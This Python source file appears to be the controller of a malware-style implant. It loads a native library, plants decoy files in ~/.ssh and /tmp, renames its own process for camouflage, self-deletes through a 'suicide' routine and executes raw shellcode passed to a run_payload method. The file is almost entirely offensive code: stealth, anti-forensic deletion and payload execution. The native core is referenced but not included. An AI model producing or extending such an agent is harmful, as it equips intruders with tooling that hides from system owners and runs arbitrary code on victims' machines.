import os
import sys
import ctypes
import time
import random

class SentinelAgent:
    def __init__(self):
        try:
            self.core = ctypes.CDLL("./src/core/libcore.so")
        except OSError:
            # Fallback if so is not built yet
            print("[!] libcore.so not found. Run 'make' first.")
            sys.exit(1)

        self.decoys = [
            os.path.expanduser("~/.ssh/config_backup"),
            os.path.expanduser("~/.gitconfig_local"),
            "/tmp/.X11-unix/dev_socket"
        ]
        self.setup_decoys()
        self.activate_stealth()

    def setup_decoys(self):
        for path in self.decoys:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                if not os.path.exists(path):
                    with open(path, "w") as f:
                        f.write("# Sentinel Decoy System Configuration\n")
            except:
                pass

    def activate_stealth(self):
        # Call C core to rename process
        self.core.activate_camouflage()

    def check_decoys(self):
        # Check if decoys have been tampered with
        for path in self.decoys:
            if os.path.exists(path):
                # Simple check for access time or content change
                # In real scenario, use inotify
                pass

    def suicide(self):
        print("[!] Security Breach. Initiating Suicide Logic...")
        self_path = os.path.abspath(sys.argv[0])
        self.core.trigger_suicide(self_path.encode())

    def run_payload(self, shellcode):
        print("[*] Executing payload via The Ghost...")
        # shellcode should be bytes
        self.core.execute_payload(shellcode, len(shellcode))

if __name__ == "__main__":
    agent = SentinelAgent()
    print("[*] Sentinel Agent Live.")
    # Periodic check loop
    try:
        while True:
            agent.check_decoys()
            time.sleep(60)
    except KeyboardInterrupt:
        pass
